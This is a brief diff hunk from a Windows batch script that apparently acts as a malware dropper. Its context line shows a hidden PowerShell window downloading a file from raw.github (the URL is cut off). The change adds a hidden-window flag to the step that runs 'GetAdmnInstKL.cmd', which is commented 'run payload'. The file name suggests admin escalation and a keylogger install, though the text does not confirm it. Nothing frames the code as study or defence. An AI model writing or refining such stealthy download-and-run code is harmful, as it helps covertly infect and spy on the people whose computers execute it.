@@ -14,7 +14,7 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 
 
 @REM run payload
-powershell ./GetAdmnInstKL.cmd
+powershell -windowstyle hidden ./GetAdmnInstKL.cmd
 
 @REM cd back into initial path 
 @REM cd "%INITIALPATH%"
